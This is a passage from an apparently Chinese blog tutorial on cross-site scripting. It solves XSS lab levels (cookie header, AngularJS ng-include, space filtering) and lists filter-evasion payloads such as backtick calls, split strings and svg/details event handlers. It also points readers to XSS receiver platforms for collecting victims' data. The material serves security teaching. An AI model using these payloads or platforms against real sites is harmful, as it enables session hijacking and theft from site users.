align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的漏洞点出现在了HTTP请求头的<code>Cookie</code>的<code>user</code>属性中。</p>
+<p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>Cookie</code>字段：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555500926177.png" alt="1555500926177"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第14关-Angular-JS"><a href="#第14关-Angular-JS" class="headerlink" title="第14关 Angular JS"></a>第14关 Angular JS</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">AngularJS ng-include 指令</a></p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
+<p><img src="http://qiniuyun.lintstar.top/1555507993008.png" alt="1555507993008"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="第15关-过滤空格"><a href="#第15关-过滤空格" class="headerlink" title="第15关 过滤空格"></a>第15关 过滤空格</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
+<p>可以使用如下符号替代空格</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>URL编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>回车(CR)</td>
+<td>%0d</td>
+</tr>
+<tr>
+<td>换行(LF)</td>
+<td>%0a</td>
+</tr>
+<tr>
+<td>？？？求补充</td>
+<td>%0c</td>
+</tr>
+</tbody>
+</table>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="XSS-实战应用"><a href="#XSS-实战应用" class="headerlink" title="XSS 实战应用"></a>XSS 实战应用</h1><h2 id="XSS-平台搭建"><a href="#XSS-平台搭建" class="headerlink" title="XSS 平台搭建"></a>XSS 平台搭建</h2><p>推荐一个经典开源的 XSS 平台：</p>
+<p><strong>项目地址</strong>：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p><strong>Fork 地址</strong>：<a href="https://github.com/winthorlimo/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/winthorlimo/BlueLotus_XSSReceiver</a></p>
+<p>无需数据库，将源码放入到网站目录下访问即可，配置记录好平台的后台登录密码：</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200803134636686.png" alt="image-20200803134636686"></p>
+<p>以后再次登录手动访问 login.php 即可重新登录</p>
+<p>后台地址：<a href="http://127.0.0.1/xss/login.php" target="_blank" rel="noopener">http://127.0.0.1/xss/login.php</a></p>
+<p>此时别人访问 <a href="http://127.0.0.1/xss/" target="_blank" rel="noopener">http://127.0.0.1/xss/</a> 也会被钓鱼记录。</p>
+<h2 id="第三方XSS平台"><a href="#第三方XSS平台" class="headerlink" title="第三方XSS平台"></a>第三方XSS平台</h2><p><a href="https://xss8.cc/xss.php" target="_blank" rel="noopener">https://xss8.cc/xss.php</a></p>
+<p><a href="https://xss.pt/xss.php" target="_blank" rel="noopener">https://xss.pt/xss.php</a></p>
+<h2 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h2><blockquote>
+<p>百度百科：<strong>奇技淫巧</strong>，读音qí jì yín qiǎo，是一个成语，意思是指过于奇巧，让人着迷，却又无益的技艺与制品。奇：奇异，奇巧，有趣的。技：技术，技巧，带有技术性的。淫：过分，极端，沉迷，上瘾。</p>
+</blockquote>
+<h3 id="反引号代替圆括号"><a href="#反引号代替圆括号" class="headerlink" title="反引号代替圆括号"></a>反引号代替圆括号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="location-拆分"><a href="#location-拆分" class="headerlink" title="location + 拆分"></a>location + 拆分</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:alert(1)"</span>&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:alert%281%29"</span>&gt;  <span class="comment">// URL 编码</span></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:"</span>+<span class="string">"aler"</span>+<span class="string">"t(1)"</span>&gt; <span class="comment">// 也可以拆分</span></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:"</span>+<span class="string">"aler"</span>+<span class="string">"t%281%29"</span>&gt;  <span class="comment">// URL编码+拆分</span></span><br></pre></td></tr></table></figure>
+<h3 id="svg-top"><a href="#svg-top" class="headerlink" title="svg + top"></a>svg + top</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=top[<span class="string">'alert'</span>](<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=top[<span class="string">'al'</span>+<span class="string">'ert'</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="detail-top"><a href="#detail-top" class="headerlink" title="detail + top"></a>detail + top</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br><span class="line">&lt;details ontoggle=top[<span class="string">"alert"</span>](<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br><span class="line">&lt;details open ontoggle=top[<span class="string">"alert"</span>](<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>HTML <code>&lt;details&gt;</code>元素</strong>可创建一个挂件，仅在被切换成展开状态时，它才会显示内含的信息</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    离沫凌天๓
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html" title="XSS跨站脚本攻击">https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/note/2020/undefined05/4089de4e.html" rel="next" title="文件包含漏洞">
+                <i class="fa fa-chevron-left"></i> 文件包含漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/note/2020/undefined07/ecd34c17.html" rel="prev" title="CSRF跨站请求伪造攻击">
+                CSRF跨站请求伪造攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="离沫凌天๓">
+            
+              <p class="site-author-name" itemprop="name">离沫凌天๓</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS跨站脚本攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS跨站脚本攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS简介"><span class="nav-number">1.1.</span> <span class="nav-text">XSS简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS跨站脚本实例"><span class="nav-number">1.2.</span> <span class="nav-text">XSS跨站脚本实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS的危害"><span class="nav-number">1.3.</span> <span class="nav-text">XSS的危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS分类"><span class="nav-number">2.</span> <span class="nav-text">XSS分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型XSS（非持久型）"><span class="nav-number">2.1.</span> <span class="nav-text">反射型XSS（非持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储XSS（持久型）"><span class="nav-number">2.2.</span> <span class="nav-text">存储XSS（持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM型-XSS"><span class="nav-number">2.3.</span> <span class="nav-text">DOM型 XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS靶场搭建"><span class="nav-number">3.</span> <span class="nav-text">XSS靶场搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-For-Pentester"><span class="nav-number">3.1.</span> <span class="nav-text">Web For Pentester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA"><span class="nav-number">3.2.</span> <span class="nav-text">DVWA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS小游戏"><span class="nav-number">3.3.</span> <span class="nav-text">XSS小游戏</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebforPentester习题讲解"><span class="nav-number">4.</span> <span class="nav-text">WebforPentester习题讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第1关-无任何过滤"><span class="nav-number">4.1.</span> <span class="nav-text">第1关 无任何过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第2关-大小写绕过"><span class="nav-number">4.2.</span> <span class="nav-text">第2关 大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第3关-嵌套绕过"><span class="nav-number">4.3.</span> <span class="nav-text">第3关 嵌套绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第4关-其他标签绕过"><span class="nav-number">4.4.</span> <span class="nav-text">第4关 其他标签绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第5关-编码或者其他方法绕过"><span class="nav-number">4.5.</span> <span class="nav-text">第5关 编码或者其他方法绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第6关-闭合双引号"><span class="nav-number">4.6.</span> <span class="nav-text">第6关 闭合双引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第7关-闭合单引号"><span class="nav-number">4.7.</span> <span class="nav-text">第7关 闭合单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第8关-PHP-SELF"><span class="nav-number">4.8.</span> <span class="nav-text">第8关 PHP_SELF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第9关-location-hash"><span class="nav-number">4.9.</span> <span class="nav-text">第9关 location.hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DVWA习题讲解"><span class="nav-number">5.</span> <span class="nav-text">DVWA习题讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射-XSS-LOW"><span class="nav-number">5.1.</span> <span class="nav-text">反射 XSS LOW</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射-XSS-Medium"><span class="nav-number">5.2.</span> <span class="nav-text">反射 XSS Medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射-XSS-high"><span class="nav-number">5.3.</span> <span class="nav-text">反射 XSS high</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射-XSS-Impossible"><span class="nav-number">5.4.</span> <span class="nav-text">反射 XSS Impossible</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-LOW"><span class="nav-number">5.5.</span> <span class="nav-text">DOM XSS LOW</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-Medium"><span class="nav-number">5.6.</span> <span class="nav-text">DOM XSS Medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-high"><span class="nav-number">5.7.</span> <span class="nav-text">DOM XSS high</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-Impossible"><span class="nav-number">5.8.</span> <span class="nav-text">DOM XSS Impossible</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储-XSS-LOW"><span class="nav-number">5.9.</span> <span class="nav-text">存储 XSS LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#trim"><span class="nav-number">5.9.1.</span> <span class="nav-text">trim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stripslashes"><span class="nav-number">5.9.2.</span> <span class="nav-text">stripslashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-real-escape-string"><span class="nav-number">5.9.3.</span> <span class="nav-text">mysql_real_escape_string</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储-XSS-Medium"><span class="nav-number">5.10.</span> <span class="nav-text">存储 XSS Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addslashes"><span class="nav-number">5.10.1.</span> <span class="nav-text">addslashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strip-tags"><span class="nav-number">5.10.2.</span> <span class="nav-text">strip_tags</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htmlspecialchars"><span class="nav-number">5.10.3.</span> <span class="nav-text">htmlspecialchars</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储-XSS-high"><span class="nav-number">5.11.</span> <span class="nav-text">存储 XSS high</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储-XSS-Impossible"><span class="nav-number">5.12.</span> <span class="nav-text">存储 XSS Impossible</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS小游戏习题讲解"><span class="nav-number">6.</span> <span class="nav-text">XSS小游戏习题讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第1关-无任何过滤措施"><span class="nav-number">6.1.</span> <span class="nav-text">第1关 无任何过滤措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第2关-闭合双引号"><span class="nav-number">6.2.</span> <span class="nav-text">第2关 闭合双引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第3关-闭合单引号"><span class="nav-number">6.3.</span> <span class="nav-text">第3关 闭合单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第4关-闭合双引号"><span class="nav-number">6.4.</span> <span class="nav-text">第4关 闭合双引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第5关-javascript妙用"><span class="nav-number">6.5.</span> <span class="nav-text">第5关 javascript妙用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第6关-大小写转换"><span class="nav-number">6.6.</span> <span class="nav-text">第6关 大小写转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第7关-嵌套构造"><span class="nav-number">6.7.</span> <span class="nav-text">第7关 嵌套构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第8关-HTML编码"><span class="nav-number">6.8.</span> <span class="nav-text">第8关 HTML编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第9关-阅读源码"><span class="nav-number">6.9.</span> <span class="nav-text">第9关 阅读源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第10关-覆盖元素属性"><span class="nav-number">6.10.</span> <span class="nav-text">第10关 覆盖元素属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第11关-HTTP-Referer"><span class="nav-number">6.11.</span> <span class="nav-text">第11关 HTTP Referer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第12关-HTTP-User-Agent"><span class="nav-number">6.12.</span> <span class="nav-text">第12关 HTTP User-Agent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第13关-HTTP-Cookie"><span class="nav-number">6.13.</span> <span class="nav-text">第13关 HTTP Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第14关-Angular-JS"><span class="nav-number">6.14.</span> <span class="nav-text">第14关 Angular JS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第15关-过滤空格"><span class="nav-number">6.15.</span> <span class="nav-text">第15关 过滤空格</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-实战应用"><span class="nav-number">7.</span> <span class="nav-text">XSS 实战应用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-平台搭建"><span class="nav-number">7.1.</span> <span class="nav-text">XSS 平台搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三方XSS平台"><span class="nav-number">7.2.</span> <span class="nav-text">第三方XSS平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#奇技淫巧"><span class="nav-number">7.3.</span> <span class="nav-text">奇技淫巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反引号代替圆括号"><span class="nav-number">7.3.1.</span> <span class="nav-text">反引号代替圆括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#location-拆分"><span class="nav-number">7.3.2.</span> <span class="nav-text">location + 拆分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#svg-top"><span class="nav-number">7.3.3.</span> <span class="nav-text">svg + top</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#detail-top"><span class="nav-number">7.3.4.</span> <span class="nav-text">detail + top</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+<div class="busuanzi-count">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+    全站字数：<span class="post-count">115.8k</span>
+    </span>
+</div>
+
+
+
+
+
+<div class="BbeiAn-info">
+   	<!--津ICP备  -->
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<!-- 在网页底部添加网站运行时间 -->
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
+        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
+    }
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
